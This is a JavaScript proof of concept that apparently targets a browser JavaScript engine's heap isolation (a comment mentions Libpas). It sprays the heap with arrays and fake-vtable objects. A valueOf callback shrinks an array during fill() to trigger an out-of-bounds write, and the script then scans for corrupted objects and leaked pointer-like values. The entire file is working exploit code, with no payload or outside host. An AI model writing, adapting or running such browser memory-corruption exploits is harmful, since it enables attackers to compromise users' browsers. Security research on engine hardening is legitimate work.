
var spray = [];
for (var i = 0; i < 1000; i++) {
    var size = 64 + (i % 8) * 32; // 64, 96, 128, 160, ...
    var arr = new Array(size);
    
    
    if (i % 10 === 5) {
        arr.target_object = {
            type: "SENSITIVE",
            vtable: 0x41414141,
            exploit: function() { return 0x42424242; }
        };
    }
    
    spray.push(arr);
}


var victim_index = 500;
var victim = new Array(128); 

var trigger = {
    valueOf: function() {
        victim.length = 0;
        return 0x1000; // OOB 
    }
};

var pointer_like_data = [];
for (var i = 0; i < 100; i++) {
    pointer_like_data.push(0x40000000 + i * 0x1000); 
}

victim.fill(pointer_like_data, trigger, 0x2000);


var exploitation_success = false;

for (var i = 0; i < spray.length; i++) {
    var arr = spray[i];
    
    
    if (arr.target_object) {
        try {
            var result = arr.target_object.exploit();
            if (result !== 0x42424242) {
                alert(" VTABLE CORRUPTION: spray[" + i + "] returned " + result.toString(16));
                exploitation_success = true;
            }
        } catch (e) {
            alert(" OBJECT CORRUPTION: spray[" + i + "] crashed - " + e);
            exploitation_success = true;
        }
    }
    
    
    for (var j = 0; j < Math.min(20, arr.length); j++) {
        if (arr[j] >= 0x40000000 && arr[j] <= 0x40000000 + 0x100000) {
            alert(" POINTER-LIKE DATA FOUND: spray[" + i + "][" + j + "] = 0x" + arr[j].toString(16));
            exploitation_success = true;
        }
    }
}

if (exploitation_success) {
    alert(" EXPLOITATION TEST SUCCESSFUL!");
    alert("The OOB can reach sensitive objects in mixed heap!");
} else {
    alert("may have some isolation, but less than Libpas");
}